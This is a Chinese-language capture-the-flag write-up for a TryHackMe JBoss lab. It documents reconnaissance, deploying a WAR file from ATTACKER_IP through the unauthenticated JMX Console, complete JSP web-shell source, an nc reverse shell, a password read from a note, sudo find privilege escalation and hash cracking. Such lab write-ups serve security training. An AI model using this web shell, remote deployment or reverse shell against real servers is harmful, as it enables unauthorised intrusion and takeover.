# THM Java Deserialization 渗透测试 Writeup

**目标**: 10.49.161.102  
**平台**: TryHackMe (THM) 授权靶场  
**日期**: 2026-06-05  
**总耗时**: ~60 分钟

---

## 1. 信息搜集

### 1.1 Nmap 端口扫描
```bash
nmap -p- 10.49.161.102
```

发现 16 个开放端口：
- 22/tcp - SSH
- 80/tcp - HTTP
- 1090/tcp - ff-fms
- 1091/tcp - ff-sm
- 1098/tcp - rmiactivation
- 1099/tcp - rmiregistry
- 3873/tcp - fagordnc
- 4446/tcp - n1-fwp
- 4712/tcp - unknown
- 4713/tcp - pulseaudio
- 5445/tcp - smbdirect
- 5455/tcp - apc-5455
- 5500/tcp - hotline
- 5501/tcp - fcp-addr-srvr2
- 8009/tcp - ajp13
- 8080/tcp - http-proxy
- 8083/tcp - us-srv

### 1.2 服务版本识别
```bash
nmap -sV -p8080 10.49.161.102
```

8080 端口: **Apache Tomcat/Coyote JSP engine 1.1**

### 1.3 Web 枚举 (80端口)
```bash
gobuster dir -u http://10.49.161.102 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 50
```

发现 Hugo 0.66.0 静态博客 "Tony's Blog"，文章 "Frosted Flakes"。

### 1.4 JBoss 识别
```bash
curl -s http://10.49.161.102:8080/
```

确认是 **JBoss Application Server**，管理界面：
- /admin-console/
- /jmx-console/
- /jbossws/

---

## 2. 初始访问

### 2.1 JMX Console 未授权访问
```bash
curl -s http://10.49.161.102:8080/jmx-console/
```

JMX Console 无需认证即可访问，主机名: **thm-java-deserial.home**

### 2.2 检查 MainDeployer MBean
```bash
curl -s 'http://10.49.161.102:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system%3Aservice%3DMainDeployer'
```

发现 MainDeployer 的 deploy() 方法 (methodIndex=17)。

### 2.3 构建恶意 WAR
```bash
mkdir -p cmdshell/WEB-INF
cat > cmdshell/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                             http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
    <servlet>
        <servlet-name>shell</servlet-name>
        <jsp-file>/shell.jsp</jsp-file>
    </servlet>
    <servlet-mapping>
        <servlet-name>shell</servlet-name>
        <url-pattern>/shell.jsp</url-pattern>
    </servlet-mapping>
</web-app>
EOF

cat > cmdshell/shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
    }
%>
EOF

jar -cvf cmdshell.war -C cmdshell/ .
```

### 2.4 启动 HTTP 服务器
```bash
python3 -m http.server 8000 --directory /path/to/war/
```

### 2.5 部署 WAR 文件
```bash
curl -s -X POST 'http://10.49.161.102:8080/jmx-console/HtmlAdaptor' \
  -d 'action=invokeOp' \
  -d 'name=jboss.system%3Aservice%3DMainDeployer' \
  -d 'methodIndex=17' \
  -d 'arg0=http://ATTACKER_IP:8000/cmdshell.war'
```

部署成功，返回 "Operation completed successfully without a return value!"

### 2.6 验证 Web Shell
```bash
curl -s "http://10.49.161.102:8080/cmdshell/shell.jsp?cmd=id"
# uid=1000(cmnatic) gid=1000(cmnatic) groups=1000(cmnatic),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
```

### 2.7 反弹 Shell
```bash
# 攻击机监听
nc -lvnp 4444

# Web shell 执行反弹
http://10.49.161.102:8080/cmdshell/shell.jsp?cmd=nc%20-e%20/bin/bash%20ATTACKER_IP%204444
```

---

## 3. 横向移动

### 3.1 枚举用户目录
```bash
ls -la /home/
# 发现 cmnatic, jboss 用户
```

### 3.2 发现 jboss 用户密码
```bash
cat /home/jboss/note
```

内容：
```
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.
However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)
Password: likeaboss

Kind Regards,
CMNatic
```

### 3.3 切换到 jboss 用户
```bash
su jboss
# 密码: likeaboss
```

---

## 4. 权限提升

### 4.1 检查 sudo 权限
```bash
sudo -l
```

输出：
```
User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
```

### 4.2 利用 sudo find 提权
```bash
sudo find / -exec /bin/bash \;
```

获取 root shell。

---

## 5. Flag 获取

### 5.1 图片隐写 Flag
```bash
strings /tmp/frosted_flakes.jpg | grep THM
```

**Flag**: `THM{Tony_Sure_Loves_Frosted_Flakes}`

### 5.2 User Flag
```bash
cat /home/jboss/.jboss.txt
```

**Flag**: `THM{50c10ad46b5793704601ecdad865eb06}`

### 5.3 Root Flag
```bash
cat /root/root.txt
```

内容: `QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==`

Base64 解码: `BC77AC072EE30E3760806864E234C7CF`

MD5 破解 (john + rockyou.txt): `zxcvbnm123456789`

---

## 6. 攻击链总结

```
Nmap 扫描 → 发现 JBoss AS (8080)
  → JMX Console 未授权访问
  → 部署恶意 WAR 获取 webshell
  → 反弹 shell (cmnatic)
  → 读取 /home/jboss/note 获取 jboss 密码 (likeaboss)
  → su jboss
  → sudo -l 发现 NOPASSWD: find
  → sudo find / -exec /bin/bash \;
  → root
```

## 7. 关键技术点

- **JBoss JMX Console 利用**: 通过 MainDeployer.deploy() 部署远程 WAR 文件
- **WAR 文件部署**: 使用本地 HTTP 服务器提供 WAR，目标服务器远程拉取部署
- **反弹 shell**: 使用 nc -e /bin/bash 反弹交互式 shell
- **sudo 提权**: find 命令的 -exec 参数可以执行任意命令，经典 Linux 提权技术
- **MD5 破解**: 使用 john + rockyou.txt 破解 MD5 hash

## 8. 参考

- JBoss JMX Console Exploit: https://www.exploit-db.com/exploits/16316
- GTFOBins - find: https://gtfobins.github.io/gtfobins/find/